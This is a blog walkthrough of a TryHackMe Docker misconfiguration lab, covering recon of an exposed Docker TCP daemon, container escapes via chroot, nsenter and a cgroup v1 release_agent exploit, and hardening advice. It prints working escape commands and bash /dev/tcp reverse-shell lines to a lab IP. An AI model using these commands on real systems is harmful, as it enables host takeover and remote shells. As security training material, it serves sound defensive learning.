<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Exploring Docker Misconfigurations | halcyondream</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Exploring Docker Misconfigurations" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This walkthrough will cover the “Docker Practical” from TryHackMe’s Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here." />
<meta property="og:description" content="This walkthrough will cover the “Docker Practical” from TryHackMe’s Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here." />
<link rel="canonical" href="http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations.html" />
<meta property="og:url" content="http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations.html" />
<meta property="og:site_name" content="halcyondream" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-09-03T00:00:00-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Exploring Docker Misconfigurations" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-03T00:00:00-04:00","datePublished":"2024-09-03T00:00:00-04:00","description":"This walkthrough will cover the “Docker Practical” from TryHackMe’s Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here.","headline":"Exploring Docker Misconfigurations","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations.html"},"url":"http://localhost:4000/2024/09/03/Exploring-Docker-Misconfigurations.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="halcyondream" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">halcyondream</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Exploring Docker Misconfigurations</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2024-09-03T00:00:00-04:00" itemprop="datePublished">Sep 3, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This walkthrough will cover the “Docker Practical” from TryHackMe’s Container Security path. The environment is an insecure, goat-like deployment, meant for excessive hacking. You are unlikely to find something like this in the wild; but, in the rare case that you do, be aware of the attack vectors laid out here.</p>

<p>In the real world, you might see these vulnerabilities in piecemeal, but likely not all together at once. The root causes lay in the configuration: weak or nonexistent permissions; insecure exposure of the docker API; and an underlying system that still supports Cgroup v1. Taken together, you can start to appreciate how you might approach an environment that uses any (hopefully not <em>all</em>) of these insecure configurations.</p>

<p>One way we can appreciate such a box is by remembering that Kubernetes has been around only for about a decade. Prior to its wide adoption, infrastructure engineers and software developers needed solutions that “worked” in lieu of a formal orchestration software and API. Let’s imagine that an organization is still using their own solution, which was stood up long ago, and is off limits for upgrades because “it just works.”</p>

<h1 id="building-the-lab-yourself">Building the lab yourself</h1>

<p>In exploring security misconfigurations, you naturally need to understand where such configuration definitions live, and how to set them up, before you can effectively abuse them. This walkthrough will explore the configs and their locations.</p>

<p>You can find a <a href="https://github.com/halcyondream/exploring-docker-security">near-identical build spec of this underlying system here</a>. This includes the necessary configurations, along with a Vagrantfile that you can use to spin up the environment on your local system. Some tweaks were made, and were very deliberate; but, since both systems share the same underlying root causes, it is not difficult to exploit.</p>

<p>Either way, try to approach the environment as a “black box,” performing the typical stages of discovery, reconnaissance, etc. before reviewing the source code. Afterwards, try to figure out what else the environment is doing; these additional findings may prove invaluable in a real-world assessment. Finally, use this to make specific recommendations for the entire SDLC, and try to redeploy a “safe” version of this infrastructure.</p>

<h1 id="exploring-the-environment">Exploring the environment</h1>

<p>In this engagement, we want to try to find a methodology for testing container or Docker vulnerabilities. We also want to explore the assumptions made in the THM guide. Although the lab provides a set of SSH credentials, let’s ignore them for now. Instead, imagine that you’re performing a black-box test of this system.</p>

<p>First, check for any open ports:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~# nmap --open -p- -sV 10.10.20.228

Starting Nmap 7.60 ( https://nmap.org ) at 2024-07-11 20:07 BST

Nmap scan report for ip-10-10-20-228.eu-west-1.compute.internal (10.10.20.228)
Host is up (0.00044s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker  Docker 20.10.20
MAC Address: 02:B8:7C:7F:90:CD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.54 seconds
</code></pre></div></div>

<p>Note the following observations:</p>
<ul>
  <li>Two open SSH ports: 22 and 2222</li>
  <li>Both SSH services are of different versions</li>
  <li>Docker is opened on its default port of 2375</li>
  <li>OS scan returns nothing of value</li>
</ul>

<p>At this point, you should stop and ask yourself: <em>what is this host supposed to do</em>? We will build on this question throughout the guide. However, given the exposed Docker daemon, we can start to infer that this host is responsible for some degree of container orchestration tasks.</p>

<p>What is a container orchestrator? <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf">NIST SP 800-190</a> provides a succinct, platform-agnostic definition:</p>

<blockquote>
  <p>Tools known as orchestrators enable DevOps personas or automation working on their behalf to pull images from registries, deploy those images into containers, and manage the running containers.</p>
</blockquote>

<p>The orchestrator’s role is shown in the following workflow provided by the publication:</p>

<p><img src="https://www.researchgate.net/profile/Karen-Scarfone/publication/329973333/figure/fig2/AS:708952811642880@1546038930270/Container-Technology-Architecture-Tiers-Components-and-Lifecycle-Phases.png" alt="" /></p>

<p>The relationship between “Orchestrator” and “Admin” illustrates a heavy degree of trust. Excessive privileges <em>and</em> unauthorized access are both covered in section 3.1, which covers the risks of “unbounded administrative access:”</p>

<blockquote>
  <p>Historically, many orchestrators were designed with the assumption that all users interacting with them would be administrators and those administrators should have environment-wide control. However, in many cases, a single orchestrator may run many different apps, each managed by different teams, and with different sensitivity levels. If the access provided to users and groups is not scoped to their specific needs, a malicious or careless user could affect or subvert the operation of other containers managed by the orchestrator.</p>
</blockquote>

<p>Indeed, <em>unbounded administrative access</em> is <a href="https://docs.docker.com/config/daemon/remote-access/">one such consequence of exposing Docker’s daemon via a TCP port</a>:</p>

<blockquote>
  <p>Configuring Docker to accept connections from remote clients can leave you vulnerable to unauthorized access to the host and other attacks.</p>

  <p>It’s critically important that you understand the security implications of opening Docker to the network. If steps aren’t taken to secure the connection, it’s possible for remote non-root users to gain root access on the host.</p>

  <p>Remote access without TLS is <strong>not recommended</strong></p>
</blockquote>

<p>The bit about “gaining root access to the host” is a consequence of abundant privileges given to the Docker daemon. For example, one could mount the host’s root filesystem to a container and <em>chroot</em> into it; or, for a privileged container, could use <em>nsenter</em> to enter the init Namespace, which effectively gives the user root access. Both exploits are provided later, but you should consider that a setup like this may be plagued with privilege escalation vectors.</p>

<p>For now, let’s roll with the speculation that this host is part of a container orchestration process. Perhaps its configuration predates a more robust solution, like Kubernetes.</p>

<p>Let’s try to understand what else this system is doing. Try some Docker recon with <em>ps</em>, which returns a list of running containers:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~# docker -H 10.10.20.228 ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                               NAMES
7b7461f9882e        dockertest          "/usr/sbin/sshd -D"   6 months ago        Up 8 minutes        0.0.0.0:22-&gt;22/tcp, :::22-&gt;22/tcp   beautiful_pasteur
</code></pre></div></div>

<p>The fact that port 22 is exposed to the host is interesting. Based on the Nmap results earlier, we can infer that the Port 22 SSH server on the host is, in fact, this container. The irony is that, with the Docker daemon exposed over TCP, an attacker does not need to SSH into this box at all in order to compromise it.</p>

<p>Next, let’s inspect the runtime parameters for this container:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~# docker -H 10.10.20.228 inspect 7b7461f9882e
</code></pre></div></div>

<p>Observe the following:</p>
<ul>
  <li>There is a bind mount for <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code> in the container</li>
  <li>AppArmor is set to “unconfined,” which effectively disables AppArmor</li>
  <li>The container is running in Privileged mode</li>
  <li>Port 22 is exposed and bound to all interfaces on the host (<code class="language-plaintext highlighter-rouge">0.0.0.0</code>), confirming the suspicion that this is the open port 22 from the Nmap scan
    <ul>
      <li>Likewise, we can speculate that port 2222 is coming from the host</li>
    </ul>
  </li>
  <li>Labels suggest that the base image is <code class="language-plaintext highlighter-rouge">ubuntu:18.04</code></li>
</ul>

<p>The first three points are concerning, as each of them represents a security issue:</p>
<ul>
  <li>Binding <em>docker.sock</em> exposes the host’s daemon to the container. This allows the container access the host’s Docker directly: listing images, launching containers, executing commands, and so forth.</li>
  <li>AppArmor handles the container’s security profile. Setting it to <code class="language-plaintext highlighter-rouge">unconfined</code> effectively disables any protections in the container.</li>
  <li>Privileged mode effectively gives container full control over the host system. If a privileged container were compromised, an attacker could leverage it to perform arbitrary damage against the host.</li>
</ul>

<p>It’s worth stopping here and noting that these are <em>not</em> default settings for <code class="language-plaintext highlighter-rouge">docker run</code>.</p>

<p>With that in mind, why would someone want to relax these settings? In the context of DevSecOps, this setup could facilitate CI/CD goals. A lesser-known, perhaps antiquated example of this is Jenkins:</p>
<ul>
  <li>The <a href="https://www.jenkins.io/doc/book/installing/docker/#on-macos-and-linux">official Jenkins Docker install guide</a> explicitly says to use <code class="language-plaintext highlighter-rouge">--privileged</code> mode, although it “may be relaxed with newer Linux versions.” Note that they provide no recommendation here about a more secure specification.</li>
  <li>The <a href="https://www.jenkins.io/doc/book/pipeline/docker/#using-a-remote-docker-server">Docker Pipeline plugin</a> will communicate with the local daemon via <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code>. Likewise, the <a href="https://plugins.jenkins.io/docker-slaves/">Docker slaves plugin</a> has notes about bind mounting <code class="language-plaintext highlighter-rouge">docker.sock</code> in a build container.</li>
  <li>Although Jenkins takes no official stance on AppArmor, a developer or maintainer may choose to disable it in the event that AppArmor is conflicting with the container’s needs.</li>
</ul>

<p>If this highly-privileged container has jurisdiction over the CI/CD process, then controlling it would give you a foothold to manipulate the build and deployment processes of applications or services. This is hugely problematic and a big find, if applicable.</p>

<p>For now, though, we lack a perfect understanding of that container’s purpose. Let’s keep inspecting it.</p>

<p>Use <code class="language-plaintext highlighter-rouge">docker history</code> to view information about each layer:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker -H 10.10.20.228 history --no-trunc dockertest
</code></pre></div></div>

<p>The output will show each layer, starting with the last layer first. For clarity, let’s remove the column headers, SHA256 hash, and uptime:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... /bin/sh -c #(nop)  CMD ["/usr/sbin/sshd" "-D"]                               
... /bin/sh -c #(nop)  EXPOSE 22                                                 
... /bin/sh -c #(nop)  USER root        
...
</code></pre></div></div>

<p>You can start to see the original Dockerfile from this output:</p>
<ul>
  <li>Notice that each line after <code class="language-plaintext highlighter-rouge">/bin/sh -c #(nop)</code> represents a Dockerfile directive.</li>
  <li>Any shell command (without an explicit directive) preceded by <code class="language-plaintext highlighter-rouge">/bin/sh -c</code> represents a RUN directive.</li>
  <li>Finally, the last few lines match with the official Ubuntu 18.04 image on the Docker registry, so we can infer that it represents <code class="language-plaintext highlighter-rouge">FROM ubuntu:18.04</code>.</li>
</ul>

<p>Using all of this output, we can reconstruct the image:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM ubuntu:18.04

RUN apt-get -qq update &amp;&amp; \
	DEBIAN_FRONTEND=noninteractive \
		apt-get -y --no-install-recommends -qq install \
			openssh-server \
			apt-utils \
			libcap2-bin \
			curl \
			ca-certificates \
			sudo &amp;&amp; \
	mkdir -p /var/run/sshd &amp;&amp; \
	mkdir -p /root/.ssh &amp;&amp; \
	mkdir -p /etc/pki/tls/certs &amp;&amp; \
	echo "Packages installed"

RUN curl -sSL https://get.docker.com/ | sh

RUN useradd -m tryhackme -s /bin/bash &amp;&amp; \
	mkdir -p /home/tryhackme/.ssh &amp;&amp; \
	echo "tryhackme:tryhackme!" | chpasswd &amp;&amp; \
	echo "tryhackme user successfully added"

RUN echo "tryhackme ALL=(ALL,!root) NOPASSWD: /bin/bash" &gt;&gt; /etc/sudoers &amp;&amp; \
	echo "tryhackme user added to sudoers"

WORKDIR /etc/ssh

RUN echo "root:tryhackme123!" | chpasswd &amp;&amp; \
	echo "Successfully changed root password" &amp;&amp; \
	sed --in-place 's/^\(UsePAM\|PermitRootLogin\)/#\1/' sshd_config &amp;&amp; \
	echo "" &gt;&gt; sshd_config &amp;&amp; \
	echo "UsePAM no" &gt;&gt; sshd_config &amp;&amp; \
	echo "PermitRootLogin yes" &gt;&gt; sshd_config &amp;&amp; \
	echo "SSHD updated" 

USER root

EXPOSE 22

CMD ["/usr/sbin/sshd", "-D"]
</code></pre></div></div>

<p>Hardcoded secrets are revealed. These match the credentials given by the TryHackMe lab. However, let’s pretend we didn’t see those (i.e., that the developer had chosen to manage secrets securely), and continue investigating.</p>

<p>Even without the root user’s credentials, we could still enter the container. The first way, as noted earlier, is by using <code class="language-plaintext highlighter-rouge">docker exec</code> to launch a shell or shell commands directly.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker -H 10.10.20.228 exec -it 7b7461f9882e bash
</code></pre></div></div>

<p>For this system, the <code class="language-plaintext highlighter-rouge">-it</code> switch is probably easier to get the shell than a reverse shell would be. However, a reverse shell is still possible from a container, and may be necessary in some cases (for example, from a web application). In those cases, the system shells may be removed when the image is built, so the shell command will need to fit the use case and vulnerability.</p>

<p>Still, we can try it here as a simple proof. To connect via a reverse shell, start a listener on the host:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 4242
</code></pre></div></div>

<p>Then, leverage the exposed container. Since the image is Ubuntu, we can use a raw Bash TCP connection.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker -H 10.10.20.228 exec 7b7461f9882e \
	bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.12/4242 0&gt;&amp;1'
</code></pre></div></div>

<p>Either way, you get an interactive terminal, just like with SSH. You can effectively walk through the lab vulnerabilities from this point, without any knowledge of the SSH credentials that were given. A deeper dive into the vulnerabilities is given in a later section.</p>

<p>Now, let’s explore the host system’s configuration. As with the privileged container, we want to explore it with the intention of providing more valuable feedback about the system, as well as to prove some assumptions made during reconnaissance.</p>

<p>At this stage, we do need to escape. From the privileged container, we could use <code class="language-plaintext highlighter-rouge">nsenter</code> to enter the init namespace, thereby giving us a root shell.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nsenter --target 1 --mount --uts --ipc --net /bin/bash
</code></pre></div></div>

<p>We could also break out by launching a container, which targets host’s root filesystem, in order to gain a root shell. The benefit of this approach is that we could do so without needing to enter the privileged container at all: that is, by solely exploiting the exposed Docker TCP port.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker -H 10.10.20.228:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
</code></pre></div></div>

<p>The exposed TCP port also allows us to spawn a temporary container that immediately enters the namespace of PID 1. Note that, in this approach, we also have to</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker -H 10.10.20.228:2375 run --rm -it --pid=host --privileged alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/bash
</code></pre></div></div>

<p>Regardless of the method, we have access to the host as the root user.</p>

<p>Using <code class="language-plaintext highlighter-rouge">cat</code>, we can prove that the host admin has configured the Docker daemon to listen over the network.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~# cat /etc/docker/daemon.json
{
  "hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]
}

~# cat /etc/systemd/system/docker.service.d/override.conf
[Service]
 ExecStart=
 ExecStart=/usr/bin/dockerd --config-file /etc/docker/daemon.json
</code></pre></div></div>

<p>As noted earlier, the <code class="language-plaintext highlighter-rouge">daemon.json</code> and systemd <code class="language-plaintext highlighter-rouge">docker.service</code> configuration are not set to this by default.</p>

<p>Informationally, we should also explore the system and find the OS version:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># uname -a
Linux 00379fa24a9d 5.15.0-1022-aws #26~20.04.1-Ubuntu SMP Sat Oct 15 03:22:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
# cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
</code></pre></div></div>

<p>Indeed, this is an instance of Ubuntu 20.04. Why is this important to know?</p>

<p>One big reason is because Ubuntu 20.04 uses the “hybrid” implementation of cgroups v1 and v2. Cgroups v1 introduces the <code class="language-plaintext highlighter-rouge">release_agent</code> and <code class="language-plaintext highlighter-rouge">notify_on_release</code> behaviors (defined in <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt">Section 1.4 of the official cgroups v1 documentation</a>).</p>

<p>Although this was intended to allow custom “cleanup” behaviors for cgroups, an attacker could leverage a custom release agent to achieve persistent remote-code execution. Understandably, modern Linux distributions have moved entirely to <a href="https://man7.org/conf/lca2019/cgroups_v2-LCA2019-Kerrisk.pdf">cgroups v2, which retired the <code class="language-plaintext highlighter-rouge">release_agent</code> and <code class="language-plaintext highlighter-rouge">notify_on_release</code> behaviors</a>.</p>

<p>Docker uses control groups as one of its main “Linux primitives,” so a host running cgroups v1 will enable containers to use release agents. If the container is unprivileged, it can use release agents within the container’s namespace only. However, if the container is privileged, an attacker can achieve <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes">remote code execution on the host itself</a>.</p>

<p>Since this OS uses cgroups v1 in its hybrid model, it will enable these custom release agent behaviors. We can successfully run the cgroups exploit via the privileged container:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /tmp/cgrp <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> cgroup <span class="nt">-o</span> rdma cgroup /tmp/cgrp <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /tmp/cgrp/x
<span class="nb">echo </span>1 <span class="o">&gt;</span> /tmp/cgrp/x/notify_on_release
<span class="nv">host_path</span><span class="o">=</span><span class="sb">`</span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$host_path</span><span class="s2">/exploit"</span> <span class="o">&gt;</span> /tmp/cgrp/release_agent
<span class="nb">echo</span> <span class="s1">'#!/bin/sh'</span> <span class="o">&gt;</span> /exploit
<span class="nb">echo</span> <span class="s2">"cat /home/cmnatic/flag.txt &gt; </span><span class="nv">$host_path</span><span class="s2">/flag.txt"</span> <span class="o">&gt;&gt;</span> /exploit
<span class="nb">chmod </span>a+x /exploit
sh <span class="nt">-c</span> <span class="s2">"echo </span><span class="se">\$\$</span><span class="s2"> &gt; /tmp/cgrp/x/cgroup.procs"</span>
</code></pre></div></div>

<p><em>Note: You can also try <a href="https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html">Alex Chapman’s release-agent exploit</a>, an alternative which uses PID brute-forcing in cases where you can’t access the underlying filesystem.</em></p>

<p>This is a blind attack, which means we won’t get any explicit feedback. If successful it would execute the script at <code class="language-plaintext highlighter-rouge">/exploit</code>. In this case, it will copy the contents of a file (<code class="language-plaintext highlighter-rouge">flag.txt</code>) from a user’s home folder on the host system to a target location in the container.</p>

<p>However, the biggest flaw in the release agent model is that an attacker can author it to perform arbitrary commands. Instead of exfiltration, this could remove or encrypt (ransomware) sensitive files on the host. It could also be used to transfer files to the host, such as the attacker’s SSH keys.</p>

<p>Finally, if cgroup v1 is your <em>only</em> attack vector for escaping the container, you could abuse it to launch a reverse shell, which provides a direct connection to the host:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /tmp/cgrp <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> cgroup <span class="nt">-o</span> rdma cgroup /tmp/cgrp <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /tmp/cgrp/x
<span class="nb">echo </span>1 <span class="o">&gt;</span> /tmp/cgrp/x/notify_on_release
<span class="nb">echo</span> <span class="s2">"#!/bin/sh"</span> <span class="o">&gt;</span> /exploit
<span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.12/4242 0&gt;&amp;1'"</span> <span class="o">&gt;</span> /exploit
<span class="nb">chmod </span>a+x /exploit
sh <span class="nt">-c</span> <span class="s2">"echo </span><span class="se">\$\$</span><span class="s2"> &gt; /tmp/cgrp/x/cgroup.procs"</span>
</code></pre></div></div>

<p>If you were trying to recreate this lab in your own VM, you would likely want an environment that supported this hybrid, so you could achieve the release-agent exploit. Of course, newer Linux distros have moved away from v1 entirely, and therefore no longer support cgroups release agents. If this were Ubuntu 21.10 or higher, that exploit would fail.</p>

<p>In any case, all things taken into consideration, we can lay out a rough workflow for this system:</p>

<p><img src="/assets/2024-09-04/docker-architecture-flow.png" alt="" /></p>

<p>This does, in fact, resemble the “orchestrator” architecture noted earlier. In this implementation, note the circular relationship between the Docker Daemon and the “control (privileged) container.” Recall that the container has mounted the Docker socket, so it can use the host’s daemon as it needs.</p>

<p>Realistically, the goal here is orchestration. However, the design leaves room for excessive abuse of the entire system. To recap the steps taken, consider the general attack flow we took, which looked something like this:</p>

<p><img src="/assets/2024-09-04/docker-attack-flow.png" alt="" /></p>

<p>Note that most of the exploitation was made easy because of the exposed TCP daemon, which provided unrestricted control over the Docker and host systems alike.</p>

<h1 id="exploitation">Exploitation</h1>

<p>The TryHackMe room notes four vulnerabilities:</p>

<ul>
  <li>Exploiting cgroup v1</li>
  <li>Mounting the root filesystem to a new container</li>
  <li>RCE via an exposed Daemon over TCP</li>
  <li>Exploiting namespaces (<code class="language-plaintext highlighter-rouge">nsenter</code>)</li>
</ul>

<p>In our exploration of the system, we leveraged the exposed TCP daemon as well as ways to break out of the container (by <em>chroot</em>-ing into a container on the host filesystem, or by using <em>nsenter</em> from the privileged container). The cgroup exploit is an interesting blind attack, and you could certainly pull it off on an older system. However, as more production environments migrate and upgrade, this attack will become less applicable in time.</p>

<p>Let’s revisit the “Important Context” from the TryHackMe site:</p>

<blockquote>
  <p>This room focuses on exploiting the Docker daemon itself, which often, relies on having elevated permissions within the container… this room assumes that you have already managed to become root in the container.</p>
</blockquote>

<p>In retrospect, this “context” is interesting. One one hand, it’s easy to appreciate the assertion here, as the privileged container was one valid attack path. However, the bigger concern was, as noted, the daemon exposed over the TCP socket. This allowed us to tamper with the privileged container, to spawn new containers, and so forth.</p>

<p>Perhaps, the authors had originally intended for Docker <em>not</em> to be exposed via its TCP socket. In that case, the privileged container becomes the bigger attack vector. Attacks against SSH or any other services running on that container become prime targets and the prerequisite to the campaign against the host machine.</p>

<p>Another interesting constraint here is that a “privileged” container, in itself, is not necessarily susceptible to as brutal of attacks. In fact, the <code class="language-plaintext highlighter-rouge">--privileged</code> flag without other misconfigurations (using the host PID, mounting the Docker scoket, exposing the Docker daemon, etc.) could really only abuse the release-agent escape or the host-filesystem mount. This is still very abuseable, but will take more work compared to the environment we explored.</p>

<p>Most of the tactics used here are also laid out in this <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation">HackTricks cheat sheet</a>. The difference is that, with an eye towards DevSecOps, we want to understand what the environment is and what it is supposed to do. That way, you can provide and plan  meaningful remediations that are relevant with respect to the system’s purpose.</p>

<h1 id="recommendations">Recommendations</h1>

<p>In general, acknowledge the following:</p>
<ul>
  <li>Disable cgroup v1 on systems that run Docker</li>
  <li>Wherever possible, <a href="https://docs.docker.com/engine/security/rootless/">run Docker in “rootless mode”</a></li>
  <li>If rootless mode is absolutely impossible for some reason, manage Docker by adding an unprivileged user, whose sole responsibility is to manage docker, to the <code class="language-plaintext highlighter-rouge">docker</code> group</li>
  <li>By default, use the most restrictive container permissions</li>
  <li>Assign only the permissions that are absolutely needed</li>
  <li>Avoid privileged containers</li>
  <li>Prefer application APIs, which implements effective authentication and authorization, over directly exposing the Docker daemon</li>
  <li>If the Docker daemon must be exposed, restrict access with key-based SSH or with TLS keys</li>
  <li>Prefer a more robust container orchestration solution, such as Kubernetes, over a home-rolled solution</li>
</ul>

<p>Many of these recommendations are aligned with <a href="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html">OWASP guidance on container security</a>.</p>

<p>Without those two protections, we abused the daemon and got RCE pretty quickly, and then explored a few ways to do so. During an engagement, you should look for these attack vectors: on the host system, Docker configuration, and container application. This can help you make a case to upgrade or move away from a weak solution, and look towards one that is resilient in the face of classic attacks.</p>

<p>The intended purpose of this system is still a bit of a mystery. The daemon over TCP, coupled with the privileged container, seems redundant, and sends an unclear message about its use cases. Each case could, on its own, serve the needs of container orchestration or CI/CD pipelines, albeit with its own caveats and security considerations; TCP via key-based TLS or SSH may be the better route.</p>

<p>Or, they could use something else. <em>Anything</em> else.</p>

<h1 id="post-script">Post-script</h1>

<p>Start the capture, generate some traffic on the host, and end the capture when you’re ready:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:~# tcpdump -i enp0s5 -w capture.pcap
tcpdump: listening on enp0s5, link-type EN10MB (Ethernet), capture size 262144 bytes
^C100 packets captured
101 packets received by filter
0 packets dropped by kernel
</code></pre></div></div>

<p>You can then inspect the capture file for any interesting traffic made by the host, including sites, objects, and passwords. For example, snooping unencrypted HTTP traffic:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:~# tshark -r capture.pcap -O http -Y http
...
Frame 45: 130 bytes on wire (1040 bits), 130 bytes captured (1040 bits)
Ethernet II, Src: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5), Dst: Parallel_00:00:18 (00:1c:42:00:00:18)
Internet Protocol Version 4, Src: 10.211.55.18, Dst: 34.223.124.45
Transmission Control Protocol, Src Port: 34910, Dst Port: 80, Seq: 1, Ack: 1, Len: 76
Hypertext Transfer Protocol
    GET / HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
            [GET / HTTP/1.1\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Request Method: GET
        Request URI: /
        Request Version: HTTP/1.1
    Host: neverssl.com\r\n
    User-Agent: curl/7.68.0\r\n
    Accept: */*\r\n
    \r\n
    [Full request URI: http://neverssl.com/]
    [HTTP request 1/1]

Frame 51: 1419 bytes on wire (11352 bits), 1419 bytes captured (11352 bits)
Ethernet II, Src: Parallel_00:00:18 (00:1c:42:00:00:18), Dst: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5)
Internet Protocol Version 4, Src: 34.223.124.45, Dst: 10.211.55.18
Transmission Control Protocol, Src Port: 80, Dst Port: 34910, Seq: 2897, Ack: 77, Len: 1365
[3 Reassembled TCP Segments (4261 bytes): #47(1460), #48(1436), #51(1365)]
Hypertext Transfer Protocol
    HTTP/1.1 200 OK\r\n
        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
            [HTTP/1.1 200 OK\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Response Version: HTTP/1.1
        Status Code: 200
        [Status Code Description: OK]
        Response Phrase: OK
